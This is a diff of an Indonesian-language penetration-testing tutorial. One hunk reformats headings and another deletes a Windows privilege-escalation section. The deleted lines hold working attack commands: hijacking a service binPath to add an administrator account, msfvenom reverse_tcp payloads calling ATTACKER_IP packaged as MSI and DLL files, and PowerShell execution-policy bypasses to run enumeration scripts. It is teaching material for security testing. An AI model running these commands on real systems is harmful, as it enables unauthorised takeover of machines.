@@ -857,13 +857,13 @@ NT AUTHORITY\SYSTEM
  
 ---
  
-## 1. Windows Kernel Exploits
- 
-### Konsep
+**1. Windows Kernel Exploits**
+
+**Konsep**
  
 Memanfaatkan **kerentanan di kernel Windows** yang belum di-patch. Cocok untuk sistem lama yang jarang diupdate.
  
-### Langkah
+**Langkah**
  
 ```bash
 # 1. Cek versi OS di Meterpreter
@@ -1133,94 +1133,6 @@ route print
 netsh firewall show state
 netsh advfirewall show allprofiles
 ```
-
-#### Teknik Privilege Escalation Windows
-
-**1. Unquoted Service Path**
-
-Jika path service mengandung spasi dan tidak dikutip, Windows akan mencoba mengeksekusi dari berbagai lokasi.
-
-```
-C:\Program Files\Vulnerable App\service.exe
-→ Windows akan coba: C:\Program.exe, C:\Program Files\Vulnerable.exe, dst.
-```
-
-```cmd
-# Cek unquoted paths
-wmic service get name,displayname,pathname,startmode | \
-  findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
-
-# Atau menggunakan PowerShell
-Get-WmiObject -Class Win32_Service | Where-Object {
-  $_.PathName -notmatch '"' -and $_.PathName -match ' '
-} | Select-Object Name, PathName
-```
-
-**2. Weak Service Permissions**
-
-```cmd
-# Cek izin service dengan accesschk
-accesschk.exe -uwcqv "Everyone" *
-accesschk.exe -uwcqv "Authenticated Users" *
-
-# Ubah binpath jika punya izin ChangeConf
-sc config VulnService binPath= "cmd.exe /c net localgroup administrators attacker /add"
-sc start VulnService
-```
-
-**3. AlwaysInstallElevated**
-
-Jika registry key berikut bernilai 1, semua MSI installer berjalan sebagai SYSTEM.
-
-```cmd
-# Cek registry
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
-# Jika keduanya 1, buat MSI payload
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f msi -o malicious.msi
-
-# Jalankan
-msiexec /quiet /qn /i malicious.msi
-```
-
-**4. DLL Hijacking**
-
-Aplikasi mencari DLL di lokasi yang bisa ditulis attacker.
-
-```cmd
-# Identifikasi missing DLLs dengan Process Monitor (ProcMon)
-# Filter: Result = NAME NOT FOUND, Path ends with .dll
-
-# Buat DLL berbahaya
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f dll -o missing.dll
-
-# Letakkan di lokasi yang dicari aplikasi
-```
-
-#### Tools Otomatis Windows PrivEsc
-
-```bash
-# WinPEAS (paling komprehensif)
-# Upload dan jalankan di target
-winpeas.exe > output.txt
-
-# PowerUp (PowerShell)
-# Upload ke target
-powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
-
-# Sherlock (untuk kernel exploits)
-powershell -ep bypass -c ". .\Sherlock.ps1; Find-AllVulns"
-
-# Via Meterpreter
-meterpreter> run post/multi/recon/local_exploit_suggester
-```
-
----
 
 ### 6.2 Linux Privilege Escalation
 
